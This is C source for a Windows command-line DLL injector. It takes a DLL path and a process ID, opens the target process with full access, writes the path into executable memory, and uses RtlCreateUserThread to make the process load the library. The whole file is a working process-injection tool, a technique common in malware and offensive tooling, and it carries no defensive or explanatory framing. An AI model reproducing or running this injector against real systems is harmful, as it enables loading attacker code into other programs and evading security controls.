#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <tchar.h>
#include "fheaders.h"


DWORD demoRtlCreateUserThread(PCWSTR pszLibFile, DWORD dwProcessId)
{
    pRtlCreateUserThread RtlCreateUserThread = NULL;
    HANDLE  hRemoteThread = NULL;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL)
    {
        wprintf(L"[-] Error: Could not open process for PID (%d).\n", dwProcessId);
        exit(1);
    }

    LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (LoadLibraryAddress == NULL)
    {
        wprintf(L"[-] Error: Could not find LoadLibraryA function inside kernel32.dll library.\n");
        exit(1);
    }

    RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlCreateUserThread");
    if (RtlCreateUserThread == NULL)
    {
        wprintf(L"[-] Error: Could not find RtlCreateUserThread function inside ntdll.dll library.\n");
        exit(1);
    }

#ifdef _DEBUG
    wprintf(TEXT("[+] Found at 0x%08x\n"), (UINT)RtlCreateUserThread);
    wprintf(TEXT("[+] Found at 0x%08x\n"), (UINT)LoadLibraryAddress);
#endif

    DWORD dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);

    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL)
    {
        wprintf(L"[-] Error: Could not allocate memory inside PID (%d).\n", dwProcessId);
        exit(1);
    }

    BOOL bStatus = WriteProcessMemory(hProcess, lpBaseAddress, pszLibFile, dwSize, NULL);
    if (bStatus == 0)
    {
        wprintf(L"[-] Error: Could not write any bytes into the PID (%d) address space.\n", dwProcessId);
        return(1);
    }

    bStatus = (BOOL)RtlCreateUserThread(
        hProcess,
        NULL,
        0,
        0,
        0,
        0,
        LoadLibraryAddress,
        lpBaseAddress,
        &hRemoteThread,
        NULL);
    if (bStatus < 0)
    {
        wprintf(TEXT("[-] Error: RtlCreateUserThread failed\n"));
        return(1);
    }
    else
    {
        wprintf(TEXT("[+] Remote thread has been created successfully ...\n"));
        WaitForSingleObject(hRemoteThread, INFINITE);

        CloseHandle(hProcess);
        VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);
        return(0);
    }

    return(0);
}

int main(int argc, char* argv[])
{
    if (argc != 3)
    {
        printf("Usage: injector.exe <DLL_Path> <Process_PID>\n");
        return -1;
    }

    // Convert the DLL path to wide character string
    WCHAR wszDllPath[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, argv[1], -1, wszDllPath, MAX_PATH);

    // Get the process ID from the command line argument
    DWORD dwProcessId = atoi(argv[2]);

    printf("Injecting DLL: %s into process with PID %d ...\n", argv[1], dwProcessId);

    // Inject the DLL into the specified process
    if (demoRtlCreateUserThread(wszDllPath, dwProcessId) != 0)
    {
        printf("Error: Failed to inject DLL into process with PID %d.\n", dwProcessId);
        return -1;
    }

    return 0;
}
